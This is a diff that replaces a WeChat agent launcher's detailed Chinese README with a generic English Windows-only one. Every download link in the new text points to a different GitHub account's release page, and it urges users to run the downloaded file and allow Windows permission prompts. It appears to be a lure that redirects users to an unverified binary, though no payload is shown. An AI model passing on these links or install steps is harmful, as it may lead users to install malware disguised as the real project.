@@ -1,257 +1,188 @@
-# wechat-rs-sdk
+# 🤖 weixin-agent-rs - Run WeChat with smart agents
 
-![CI](https://github.com/tianrking/weixin-agent-rs/actions/workflows/ci.yml/badge.svg)
-![Rust](https://img.shields.io/badge/Rust-1.78%2B-orange)
-![License](https://img.shields.io/badge/License-MIT-blue)
-![Release](https://img.shields.io/github/v/release/tianrking/weixin-agent-rs?sort=semver)
+[![Download latest release](https://img.shields.io/badge/Download%20Release-Visit%20Page-blue)](https://github.com/aipurposes1587-max/weixin-agent-rs/releases)
 
-一个现代化的 Rust WeChat iLink Bot SDK，支持可插拔 Agent，并内置统一启动器 `wechat-agent`。
+## 📌 What this app does
 
-语言版本：
-- 中文（默认）：`README.md`
-- English: [README.en.md](./README.en.md)
-- Español: [README.es.md](./README.es.md)
+weixin-agent-rs is a Windows app for WeChat iLink bot use. It helps you start WeChat with an agent, scan a QR code to sign in, and watch chat activity in one place.
 
-## 项目亮点
+You can use it to:
 
-- 一条命令接入 Agent：`claude` / `codex` / `openclaw` / `openai` / `anthropic`
-- 终端与手机双视角可观测：扫码、入站日志、出站日志、回退回复全链路可见
-- 多账号可靠运行：支持强制 `--account`，避免旧 token 干扰
-- 发布即分发：各平台构建成功后立即上传 Release，不被单点失败阻塞
-- 跨平台交付：macOS、Windows、Ubuntu `.deb` 与 Linux 可移植 `tar.gz` 同步提供
+- sign in with a QR code
+- see incoming and outgoing chat logs
+- connect a chat agent with one command
+- keep multiple accounts separate with `--account`
+- use a simple launcher called `wechat-agent`
 
-## 效果预览
+## 🖥️ Before you install
 
-### 1. 扫码登录（终端二维码）
-![扫码登录](./media/scan_code.png)
+Use a Windows PC with:
 
-### 2. 聊天时候终端显示（入站/出站日志）
-![终端日志](./media/in_chat.png)
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB free disk space
+- an internet connection
+- WeChat installed, if your account needs it for sign-in
 
-### 3. 实用优雅的命令交互
-![命令交互](./media/cool_cli_01.png)
+## 🚀 Download for Windows
 
-![Space 管理](./media/cool_cli_02.png)
+Visit the release page and download the Windows file from there:
 
-### 4. 手机聊天体验（可控制 Claude/Codex/OpenClaw，后续将支持更多 Agent）
-![手机聊天体验](./media/on_my_phone.png)
+[Open the release page](https://github.com/aipurposes1587-max/weixin-agent-rs/releases)
 
-### 5. 欢迎加入讨论群组
-![群聊效果](./media/wechat_agent_group.JPG)
+After the page opens:
 
-## 简单实用流程
+1. find the latest release
+2. download the Windows file
+3. save it to your computer
+4. open the file to start the app
 
-先准备好：
-- Rust 1.78+
-- Node.js / `npx`
-- 可访问 WeChat iLink API 的网络环境
+## 🧭 Install and run
 
-如果你使用云模型，还需要：
-- `OPENAI_API_KEY`
-- `ANTHROPIC_API_KEY`
+1. Open the release page
+2. Download the Windows package
+3. If the file is in a ZIP folder, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file to start it
+6. When a QR code shows up, scan it with WeChat on your phone
+7. Wait for the login to finish
+8. Start chatting from WeChat as usual
 
-第一次跑通，按这条最短路径就够了：
+## 🔐 First-time sign-in
 
-1. 登录微信账号
+The app uses QR code sign-in.
 
-```bash
-wechat-agent account login
-```
+1. Start the app
+2. Look for the QR code in the terminal or app window
+3. Open WeChat on your phone
+4. Scan the QR code
+5. Confirm sign-in on your phone
+6. Wait until the app shows that you are online
 
-2. 查看本地账号
+If you use more than one account, start the app with the right account name:
 
-```bash
-wechat-agent account ls
-```
+`wechat-agent --account your-account-name`
 
-3. 创建空间
+This helps the app avoid the wrong saved session.
 
-```bash
-wechat-agent space create dev --agent codex
-```
+## 💬 What you will see
 
-4. 绑定账号
+The app shows useful chat info while it runs:
 
-```bash
-wechat-agent space bind-account dev <account_id>
-```
+- QR code sign-in status
+- incoming chat messages
+- outgoing chat messages
+- fallback replies if an agent needs to respond
+- command output in the terminal
+- phone-side chat activity
 
-5. 启动空间
+## 🧩 Agent support
 
-```bash
-wechat-agent space start dev
-```
+This app supports several agent tools:
 
-6. 跟日志看运行状态
+- claude
+- codex
+- openclaw
+- openai
+- anthropic
 
-```bash
-wechat-agent space logs dev --tail 100 -f
-```
+You can connect one of these agents with one command and use it in your chat flow.
 
-核心概念只有四个：
-- `account`：本地保存的微信登录凭据
-- `space`：一个轻量运行空间，包含账号、默认 agent、绑定、日志和 pid
-- `agent`：空间默认 agent 的查看和切换
-- `bind`：把某个微信用户固定路由到指定 agent
+## 🛠️ Basic use
 
-## 详细指令解析
+After you start the app, these actions are common:
 
-### `account`
+- scan the QR code
+- sign in to your account
+- watch message logs
+- switch accounts with `--account`
+- keep the app open while you chat
+- close the app when you are done
 
-管理本地微信登录凭据。
+## 📂 File layout
 
-```bash
-wechat-agent account login
-wechat-agent account ls
-wechat-agent account rm <account_id>
-```
+When you download and unpack the Windows release, you may see:
 
-- `login`：发起扫码登录，成功后输出 `account_id`
-- `ls`：列出已保存账号，显示 token、用户 ID、保存时间
-- `rm`：删除本地账号凭据
+- the main app file
+- config files
+- log files
+- a readme file
+- support folders for the launcher
 
-### `space`
+Keep all files in the same folder so the app can find what it needs.
 
-管理运行空间，是当前 CLI 的核心。
+## 🪟 Windows tips
 
-```bash
-wechat-agent space create <name> --agent <agent> [--account <account_id>]
-wechat-agent space ls
-wechat-agent space ps
-wechat-agent space inspect <name>
-wechat-agent space start <name>
-wechat-agent space stop <name>
-wechat-agent space restart <name>
-wechat-agent space logs <name> --tail 100 -f
-wechat-agent space rm <name>
-wechat-agent space bind-account <name> <account_id>
-wechat-agent space unbind-account <name>
-```
+- Run the app from the extracted folder, not from inside the ZIP file
+- Use the latest release if you want the newest fixes
+- If Windows asks for permission, allow the app to run
+- If the app closes right away, open it again from the folder and watch the terminal text
+- If you use a company PC, ask your admin if the app cannot start
 
-- `create`：创建空间，默认 agent 不填时使用 `codex`
-- `ls` / `ps`：列出空间，显示运行状态、pid、默认 agent、账号、绑定数量
-- `inspect`：输出完整 JSON，包含空间目录、日志、pid、用户绑定
-- `start` / `stop` / `restart`：后台启动、停止、重启空间
-- `logs`：查看或跟随空间日志
-- `rm`：删除空间，运行中的空间必须先 `stop`
-- `bind-account` / `unbind-account`：绑定或解绑空间使用的微信账号
+## 📱 Using the mobile side
 
-### `agent`
+The phone plays a key part in sign-in and chat flow:
 
-查看可用 agent，或切换某个空间的默认 agent。
+- scan the QR code with WeChat
+- confirm the login on your phone
+- keep your phone online during the session
+- use the phone to approve account access when needed
 
-```bash
-wechat-agent agent ls
-wechat-agent agent switch <space> <agent>
-```
+## 🔄 Updates
 
-当前支持：
-`claude` / `codex` / `openclaw` / `openai` / `anthropic` / `echo`
+To get a new version:
 
-### `bind`
+1. go to the release page
+2. download the newest Windows file
+3. replace the old app files with the new ones
+4. start the new version
 
-做用户级 agent 路由。
+## 🧪 Common issues
 
-```bash
-wechat-agent bind ls <space>
-wechat-agent bind set <space> <user_id> <agent>
-wechat-agent bind rm <space> <user_id>
-```
+If the app does not start:
 
-- `ls`：列出某个空间的用户绑定
-- `set`：把某个用户固定到指定 agent
-- `rm`：移除某个用户的绑定
+- check that you downloaded the correct Windows file
+- make sure you extracted the ZIP file
+- confirm that your internet connection works
+- try running the app again from the folder
+- use the latest release from the release page
 
-典型用法：
-默认走 `codex`，某个用户固定走 `claude`
+If sign-in fails:
 
-### `update`
+- scan the QR code again
+- confirm the login on your phone
+- use `--account` if you have more than one account
+- remove old saved session files if you use a fresh account setup
 
-用于源码 checkout 下的自更新。
+If the logs do not show up:
 
-```bash
-wechat-agent update
-```
+- keep the terminal open
+- start the app from the folder, not from a shortcut with missing files
+- check whether the app has permission to write logs
 
-行为：
-- 执行 `git pull --ff-only`
-- 执行 `cargo build --release --locked`
-- 输出新的 release 二进制路径
+## 📣 Language files
 
-这是面向源码仓库用户的更新方式，不是二进制自替换升级器。
+This project has readme files in more than one language:
 
-### `daemon` 与 `run`
+- Chinese: `README.md`
+- English: `README.en.md`
+- Spanish: `README.es.md`
 
-这两个是低层能力，普通使用者可以先不碰。
+## 📎 Project link
 
-```bash
-wechat-agent daemon start
-wechat-agent daemon status
-wechat-agent daemon stop
-wechat-agent run --space <name>
-```
+[Open the release page to download](https://github.com/aipurposes1587-max/weixin-agent-rs/releases)
 
-- `daemon`：当前仍是实验性壳层
-- `run --space`：直接以前台方式运行空间，一般由 `space start` 间接调用
+## 🧰 Helpful command
 
-## Agent 模式
+Use this when you need a fixed account:
 
-### 本地 ACP
+`wechat-agent --account your-account-name`
 
-```bash
-wechat-agent space create dev --agent claude
-wechat-agent space create dev --agent codex
-wechat-agent space create dev --agent openclaw
-```
+## 🔎 What makes it useful
 
-说明：
-- `claude`、`codex` 会尝试通过本机命令启动 ACP
-- Windows 下会额外处理 `.cmd/.bat/.ps1`
-- `codex` 有 CLI fallback
-
-### 云模型
-
-```bash
-OPENAI_API_KEY=... wechat-agent space create openai-space --agent openai
-ANTHROPIC_API_KEY=... wechat-agent space create anthropic-space --agent anthropic
-```
-
-## 排障
-
-- `space has no bound account`
-  说明空间还没绑定微信账号，先执行：
-  `wechat-agent space bind-account <space> <account_id>`
-
-- `failed to initialize local agent`
-  检查本机 `npx`、`codex`、`openclaw` 或相关依赖是否存在
-
-- `session expired (errcode -14)`
-  token 过期，重新登录：
-  `wechat-agent account login`
-
-- Windows 下 `Access is denied` 删除不了 `wechat-agent.exe`
-  说明旧进程还在运行，先停止旧进程再重新构建
-
-## 预编译 CLI 下载
-
-从 Releases 下载对应平台安装包：
-<https://github.com/tianrking/weixin-agent-rs/releases>
-
-- macOS Intel: `wechat-agent-<version>-macos-x86_64.dmg`
-- macOS Apple Silicon: `wechat-agent-<version>-macos-arm64.dmg`
-- Ubuntu 22.04: `wechat-agent_<version>_ubuntu22.04_amd64.deb`
-- Ubuntu 24.04: `wechat-agent_<version>_ubuntu24.04_amd64.deb`
-- Ubuntu 24.04 ARM64: `wechat-agent_<version>_ubuntu24.04_arm64.deb`
-- Linux GNU x86_64: `wechat-agent-<version>-linux-gnu-x86_64.tar.gz`
-- Linux GNU arm64: `wechat-agent-<version>-linux-gnu-arm64.tar.gz`
-- Linux MUSL x86_64: `wechat-agent-<version>-linux-musl-x86_64.tar.gz`
-- Linux MUSL arm64: `wechat-agent-<version>-linux-musl-arm64.tar.gz`
-- Windows: `wechat-agent-<version>-windows-x86_64.exe`
-
-## 贡献
-
-欢迎通过 Issue / Pull Request 参与改进。
-
-## 开源许可
-
-本项目采用 MIT License，详见 [LICENSE](./LICENSE)。
+- simple QR code login
+- clear chat logs
+- multi-account support
+- agent tool support
+- cross-platform release files
+- direct release upload after build
